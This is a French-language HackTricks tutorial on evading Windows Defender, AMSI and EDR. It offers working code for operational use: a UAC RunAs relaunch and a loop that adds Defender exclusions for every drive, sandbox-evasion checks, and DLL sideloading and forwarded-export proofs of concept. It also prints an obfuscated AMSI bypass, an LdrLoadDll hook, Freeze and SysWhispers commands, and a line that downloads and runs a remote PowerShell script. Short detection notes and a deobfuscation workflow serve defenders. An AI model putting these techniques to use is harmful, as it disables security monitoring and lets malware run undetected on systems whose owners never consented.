# Bypass d’Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Cette page a initialement été rédigée par** [**@m2rc_p**](https://twitter.com/m2rc_p)** !**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot) : Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender) : Un outil pour empêcher Windows Defender de fonctionner en simulant un autre AV.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

### Appât UAC de type installateur avant toute modification de Defender

Les loaders publics se faisant passer pour des cheats de jeux sont souvent distribués sous forme d’installateurs Node.js/Nexe non signés qui **demandent d’abord à l’utilisateur une élévation de privilèges**, puis neutralisent Defender. Le processus est simple :

1. Vérifier le contexte administratif avec `net session`. La commande ne réussit que lorsque l’appelant possède des droits d’administration ; un échec indique donc que le loader s’exécute en tant qu’utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` afin de déclencher l’invite de consentement UAC attendue tout en conservant la ligne de commande d’origine.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Les victimes pensent déjà installer des logiciels « cracked », le prompt est donc généralement accepté, ce qui donne au malware les droits nécessaires pour modifier la policy de Defender.<sup>[[26]](#references)</sup>

### Exclusions `MpPreference` globales pour chaque lettre de lecteur

Une fois les privilèges élevés obtenus, les chains de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver directement le service. Le loader commence par tuer le watchdog de l’interface graphique (`taskkill /F /IM SecHealthUI.exe`), puis ajoute des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible devienne impossible à scanner :
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observations clés :

- La boucle parcourt chaque système de fichiers monté (D:\, E:\, clés USB, etc.), donc **toute future payload déposée n'importe où sur le disque est ignorée**.
- L'exclusion de l'extension `.sys` est préventive : les attaquants se réservent la possibilité de charger ultérieurement des drivers non signés sans devoir modifier à nouveau Defender.
- Toutes les modifications sont effectuées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes ultérieures de confirmer que les exclusions persistent ou de les étendre sans redéclencher l'UAC.

Comme aucun service Defender n'est arrêté, les contrôles de santé naïfs continuent d'indiquer que « l'antivirus est actif », même si l'inspection en temps réel ne touche jamais ces chemins.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : détection statique, analyse dynamique et, pour les EDR plus avancés, analyse comportementale.

### **Static detection**

La détection statique consiste à rechercher des chaînes connues comme malveillantes ou des suites d'octets dans un binaire ou un script, ainsi qu'à extraire des informations du fichier lui-même (par exemple, description du fichier, nom de l'entreprise, signatures numériques, icône, checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire détecter plus facilement, car ils ont probablement été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, l'AV ne pourra pas détecter votre programme, mais vous aurez besoin d'un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier certaines chaînes dans votre binaire ou votre script pour passer l'AV, mais cela peut prendre beaucoup de temps selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'y aura aucune signature malveillante connue, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> Une bonne méthode pour vérifier la détection statique de Windows Defender consiste à utiliser [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise essentiellement le fichier en plusieurs segments, puis demande à Defender d'analyser chacun d'eux individuellement ; il peut ainsi vous indiquer précisément quelles chaînes ou quels octets sont signalés dans votre binaire.

Je vous recommande vivement de consulter cette [playlist YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) consacrée à l'AV Evasion pratique.

### **Dynamic analysis**

L'analyse dynamique consiste à ce que l'AV exécute votre binaire dans une sandbox et surveille toute activité malveillante (par exemple, tenter de déchiffrer et de lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus difficile à gérer, mais voici quelques mesures que vous pouvez prendre pour contourner les sandbox.

- **Sleep before execution** Selon son implémentation, cette technique peut être très efficace pour contourner l'analyse dynamique de l'AV. Les AV disposent de très peu de temps pour analyser les fichiers afin de ne pas interrompre le travail de l'utilisateur ; utiliser de longues périodes d'attente peut donc perturber l'analyse des binaires. Le problème est que de nombreuses sandbox d'AV peuvent simplement ignorer cette attente selon la manière dont elle est implémentée.
- **Checking machine's resources** Les sandbox disposent généralement de très peu de ressources (par exemple, < 2 Go de RAM), sans quoi elles pourraient ralentir la machine de l'utilisateur. Vous pouvez également faire preuve de créativité, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs : tout ne sera pas nécessairement implémenté dans la sandbox.
- **Machine-specific checks** Si vous souhaitez cibler un utilisateur dont le poste de travail est joint au domaine « contoso.local », vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui que vous avez spécifié ; dans le cas contraire, vous pouvez faire quitter votre programme.

Il s'avère que le computername de la sandbox de Microsoft Defender est HAL9TH. Vous pouvez donc vérifier le nom de l'ordinateur dans votre malware avant sa detonation : si le nom correspond à HAL9TH, cela signifie que vous êtes dans la sandbox de Defender, et vous pouvez donc faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Voici d'autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons déjà dit dans cet article, les **outils publics** finiront par **être détectés**. Vous devez donc vous poser une question :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet, moins connu, qui dumpe également LSASS ?

La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, il s'agit probablement de l'un des malwares les plus signalés par les AV et les EDR, voire du plus signalé. Bien que le projet lui-même soit très intéressant, il est également extrêmement difficile à utiliser pour contourner les AV. Cherchez donc simplement des alternatives correspondant à votre objectif.

> [!TIP]
> Lorsque vous modifiez vos payloads pour l'evasion, veillez à **désactiver l'envoi automatique d'échantillons** dans Defender et, s'il vous plaît, sérieusement, **N'UPLOADEZ PAS SUR VIRUSTOTAL** si votre objectif est de maintenir l'evasion à long terme. Si vous voulez vérifier si votre payload est détectée par un AV particulier, installez-le sur une VM, essayez de désactiver l'envoi automatique d'échantillons et testez-le jusqu'à être satisfait du résultat.

## EXEs vs DLLs

Chaque fois que cela est possible, **privilégiez toujours l'utilisation de DLLs pour l'evasion**. D'après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés ; c'est donc une astuce très simple pour éviter la détection dans certains cas (si votre payload peut être exécutée en tant que DLL, bien sûr).

Comme nous pouvons le voir sur cette image, une DLL Payload de Havoc affiche un taux de détection de 4/26 sur antiscan.me, tandis que la payload EXE affiche un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparaison antiscan.me entre une payload EXE Havoc normale et une DLL Havoc normale</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces permettant d'utiliser les fichiers DLL de manière beaucoup plus furtive.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l'ordre de recherche des DLL utilisé par le loader en positionnant l'application victime et la ou les payloads malveillantes côte à côte.

Vous pouvez rechercher les programmes vulnérables au DLL Sideloading à l'aide de [Siofra](https://github.com/Cybereason/siofra) et du script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de faire l’objet d’un DLL hijacking dans « C:\Program Files\\ », ainsi que les fichiers DLL qu’ils tentent de charger.

Je vous recommande vivement d’**explorer vous-même les programmes DLL Hijackable/Sideloadable**. Cette technique est assez furtive lorsqu’elle est correctement exécutée, mais si vous utilisez des programmes DLL Sideloadable connus publiquement, vous risquez d’être facilement détecté.

Le simple fait de placer une DLL malveillante portant le nom d’une DLL qu’un programme s’attend à charger ne permettra pas de charger votre payload, car le programme s’attend à trouver certaines fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

Le **DLL Proxying** redirige les appels effectués par un programme depuis la DLL proxy (et malveillante) vers la DLL d’origine, préservant ainsi les fonctionnalités du programme tout en permettant de gérer l’exécution de votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j’ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source DLL et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) ainsi que la proxy DLL ont tous deux un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je qualifierais cela de réussite.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder le [VOD Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading, ainsi que la [vidéo d'ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), afin d'en apprendre davantage sur ce que nous avons abordé plus en profondeur.

### Exploitation des exports forwarded (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu'un appelant résout l'export, le loader Windows va :

- Charger `TargetDll` s'il ne l'est pas déjà
- Résoudre `TargetFunc` depuis celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est une KnownDLL, il est fourni depuis l'espace de noms KnownDLLs protégé (par ex. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` n'est pas une KnownDLL, l'ordre normal de recherche des DLL est utilisé, ce qui inclut le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive de sideloading indirecte : trouver une DLL signée qui exporte une fonction forwarded vers un nom de module qui n'est pas une KnownDLL, puis placer cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant et nommée exactement comme le module cible forwarded. Lorsque l'export forwarded est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.<sup>[[13]](#references)</sup>

Exemple observé sur Windows 11 :
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n’est pas une KnownDLL, elle est donc résolue via l’ordre de recherche normal.

PoC (copier-coller) :
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez une `NCRYPTPROV.dll` malveillante dans le même dossier. Un DllMain minimal suffit pour obtenir l’exécution de code ; vous n’avez pas besoin d’implémenter la fonction redirigée pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le forward avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportement observé :
- rundll32 (signé) charge le `keyiso.dll` side-by-side (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, vous obtiendrez une erreur « API manquante » uniquement après l'exécution de `DllMain`

Conseils de hunting :
- Concentrez-vous sur les exports forwarded dont le module cible n'est pas un KnownDLL. Les KnownDLLs sont répertoriées sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwarded avec des outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l’inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idées de détection/défense :
- Surveillez les LOLBins (par ex. `rundll32.exe`) chargeant des DLL signées depuis des chemins non système, puis chargeant des DLL qui ne font pas partie des KnownDLLs et qui portent le même nom de base depuis ce répertoire
- Déclenchez une alerte sur les chaînes processus/module telles que : `rundll32.exe` → `keyiso.dll` non système → `NCRYPTPROV.dll` dans des chemins accessibles en écriture par l’utilisateur
- Appliquez des stratégies d’intégrité du code (WDAC/AppLocker) et interdisez l’écriture et l’exécution dans les répertoires des applications

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’Evasion est simplement un jeu du chat et de la souris : ce qui fonctionne aujourd’hui peut être détecté demain. Ne comptez donc jamais sur un seul outil et, si possible, essayez d’enchaîner plusieurs techniques d’Evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Les EDR placent souvent des **user-mode inline hooks** sur les stubs de syscall de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs de syscall **directs** ou **indirects** qui chargent le **SSN** (System Service Number) correct et effectuent la transition vers le kernel mode sans exécuter l’entrypoint exporté hooké.<sup>[[32]](#references)</sup>

**Options d’invocation :**
- **Direct (embedded)** : émet une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun accès à un export de `ntdll`).
- **Indirect** : effectue un jump vers un gadget `syscall` existant dans `ntdll`, afin que la transition vers le kernel semble provenir de `ntdll` (utile pour l’Evasion heuristique) ; **randomized indirect** sélectionne un gadget dans un pool pour chaque appel.
- **Egg-hunt** : évite d’intégrer sur le disque la séquence d’opcodes statique `0F 05` ; résout une séquence de syscall au runtime.

**Stratégies de SSN Resolution résistantes aux hooks :**
- **FreshyCalls (VA sort)** : déduit les SSN en triant les stubs de syscall par adresse virtuelle au lieu de lire les octets des stubs.
- **SyscallsFromDisk** : mappe un `\KnownDlls\ntdll.dll` propre, lit les SSN depuis sa section `.text`, puis la démappe (contourne tous les hooks en mémoire).
- **RecycledGate** : combine la déduction des SSN par tri des VA avec la validation des opcodes lorsqu’un stub est propre ; revient à la déduction par VA si le stub est hooké.
- **HW Breakpoint** : place DR0 sur l’instruction `syscall` et utilise un VEH pour capturer le SSN depuis `EAX` au runtime, sans analyser les octets hookés.

Exemple d’utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Au départ, les AV étaient uniquement capables d’analyser les **fichiers présents sur le disque**. Ainsi, si vous pouviez exécuter des payloads **directement en mémoire**, l’AV ne pouvait rien faire pour l’empêcher, car sa visibilité était insuffisante.

La fonctionnalité AMSI est intégrée aux composants Windows suivants.

- User Account Control, ou UAC (élévation d’EXE, COM, MSI ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation dynamique du code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros Office VBA

Elle permet aux solutions antivirus d’inspecter le comportement des scripts en exposant leur contenu sous une forme à la fois non chiffrée et non obfusquée.

L’exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l’alerte suivante dans Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez qu’il ajoute `amsi:`, suivi du chemin vers l’exécutable depuis lequel le script a été exécuté, dans ce cas powershell.exe

Nous n’avons déposé aucun fichier sur le disque, mais nous avons tout de même été détectés en mémoire grâce à AMSI.

De plus, depuis **.NET 4.8**, le code C# est également analysé par AMSI. Cela affecte même `Assembly.Load(byte[])`, utilisé pour charger une exécution en mémoire. C’est pourquoi l’utilisation de versions antérieures de .NET (comme 4.7.2 ou antérieures) est recommandée pour l’exécution en mémoire si vous souhaitez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

AMSI reposant principalement sur des détections statiques, modifier les scripts que vous essayez de charger peut donc être une bonne méthode pour éviter la détection.

Cependant, AMSI est capable de désobfusquer les scripts, même s’ils comportent plusieurs couches. L’obfuscation peut donc être une mauvaise option selon la manière dont elle est effectuée. Cela rend le contournement moins évident. Toutefois, il suffit parfois de modifier quelques noms de variables pour que cela fonctionne ; cela dépend donc du niveau auquel un élément a été signalé.

- **AMSI Bypass**

AMSI étant implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de la manipuler facilement, même avec un utilisateur non privilégié. En raison de cette faille dans l’implémentation d’AMSI, des chercheurs ont découvert plusieurs moyens d’éviter l’analyse AMSI.

**Forcer une erreur**

Forcer l’échec de l’initialisation d’AMSI (amsiInitFailed) empêchera toute analyse d’être lancée pour le processus actuel. Cette technique a initialement été révélée par [Matt Graeber](https://twitter.com/mattifestation), et Microsoft a développé une signature pour empêcher une utilisation plus répandue.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d’une seule ligne de code PowerShell pour rendre AMSI inutilisable pour le processus PowerShell actuel. Cette ligne a bien sûr été détectée par AMSI lui-même ; une modification est donc nécessaire pour utiliser cette technique.

Voici un bypass d’AMSI modifié que j’ai repris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l’esprit que cela sera probablement détecté une fois cet article publié ; vous ne devriez donc publier aucun code si votre objectif est de rester indétectable.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l’adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l’analyse des entrées fournies par l’utilisateur) et à la remplacer par des instructions lui faisant retourner le code correspondant à E_INVALIDARG. Ainsi, le résultat de l’analyse réelle sera 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Consultez [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques utilisées pour bypass AMSI avec powershell. Consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement d’amsi.dll (LdrLoadDll hook)

AMSI est initialisé uniquement après le chargement d’`amsi.dll` dans le processus actuel. Un bypass robuste et indépendant du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui retourne une erreur lorsque le module demandé est `amsi.dll`. Ainsi, AMSI ne se charge jamais et aucun scan n’est effectué pour ce processus.<sup>[[23]](#references)</sup>

Vue d’ensemble de l’implémentation (pseudocode x64 C/C++) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Fonctionne avec PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait normalement AMSI).
- À associer à l’envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande trop longs.
- Utilisé par des loaders exécutés via des LOLBins (par exemple, `regsvr32` appelant `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également des scripts pour bypass AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également des scripts pour bypass AMSI et éviter les signatures grâce à des fonctions définies par l’utilisateur, des variables et des expressions de caractères randomisées, ainsi qu’en appliquant une casse aléatoire aux mots-clés PowerShell pour éviter les signatures.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus actuel. Cet outil fonctionne en analysant la mémoire du processus actuel à la recherche de la signature AMSI, puis en la remplaçant par des instructions NOP, ce qui la supprime effectivement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous trouverez une liste des produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser la version 2 de Powershell**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pourrez donc exécuter vos scripts sans qu’ils soient analysés par AMSI. Vous pouvez procéder ainsi :
```bash
powershell.exe -version 2
```
## Journalisation PS

La journalisation PowerShell est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile à des fins d'audit et de dépannage, mais cela peut également constituer un **problème pour les attaquants qui souhaitent éviter la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Disable PowerShell Transcription and Module Logging** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Use Powershell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé ; vous pourrez donc exécuter vos scripts sans qu'ils soient analysés par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session** : utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer un powershell sans défenses (c'est ce qu'utilise `powerpick` de Cobal Strike).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmente l'entropie du binaire et permet aux AV et aux EDR de le détecter plus facilement. Soyez prudent avec cela et n'appliquez éventuellement le chiffrement qu'à certaines sections de votre code qui sont sensibles ou doivent être masquées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandbox. Le workflow ci-dessous **restaure un IL presque original** qui peut ensuite être décompilé en C# avec des outils tels que dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1.  Suppression de l'anti-tampering – ConfuserEx chiffre chaque *corps de méthode* et le déchiffre à l'intérieur du constructeur statique du *module* (`<Module>.cctor`). Il modifie également la somme de contrôle PE afin que toute modification provoque le crash du binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`), qui peuvent être utiles lors de la création de votre propre unpacker.

2.  Récupération des symboles / du control-flow – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible avec ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags :
• `-p crx` – sélectionne le profil ConfuserEx 2
• de4dot annule le control-flow flattening, restaure les namespaces, les classes et les noms de variables d'origine, et déchiffre les chaînes constantes.

3.  Suppression des proxy calls – ConfuserEx remplace les appels directs de méthodes par de légers wrappers (également appelés *proxy calls*) afin de compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez observer des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire obtenu avec dnSpy, recherchez de grands blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` afin de localiser le véritable payload. Souvent, le malware le stocke sous la forme d'un tableau d'octets encodé en TLV, initialisé à l'intérieur de `<Module>.byte_0`.

La chaîne ci-dessus restaure le flux d'exécution **sans avoir besoin d'exécuter l'échantillon malveillant**, ce qui est utile lors d'un travail sur une workstation hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute`, qui peut être utilisé comme IOC afin d'effectuer automatiquement le triage des échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'objectif de ce projet est de fournir un fork open source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité des logiciels grâce à la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et à la protection contre les manipulations.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator montre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation des templates C++, ce qui compliquera un peu la tâche de la personne souhaitant cracker l'application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur de binaires x64 capable d'obfusquer différents fichiers pe, notamment : .exe, .dll, .sys
